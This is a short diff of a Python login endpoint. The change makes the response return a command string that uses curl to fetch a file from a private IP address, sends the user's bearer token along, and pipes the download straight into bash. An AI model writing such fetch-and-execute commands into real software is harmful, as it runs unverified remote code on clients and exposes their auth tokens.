@@ -37,7 +37,7 @@ def login():
             return {
                 "message": "Successfully fetched auth token",
                 "data": user,
-                "script": "python -m or sth"
+                "script": f"curl -sSL -H 'Authorization: Bearer {user["token"]}' http://172.31.0.60:5000/zip_file | bash"
             }
         except Exception as e:
             print(f"Something went wrong: {e}")
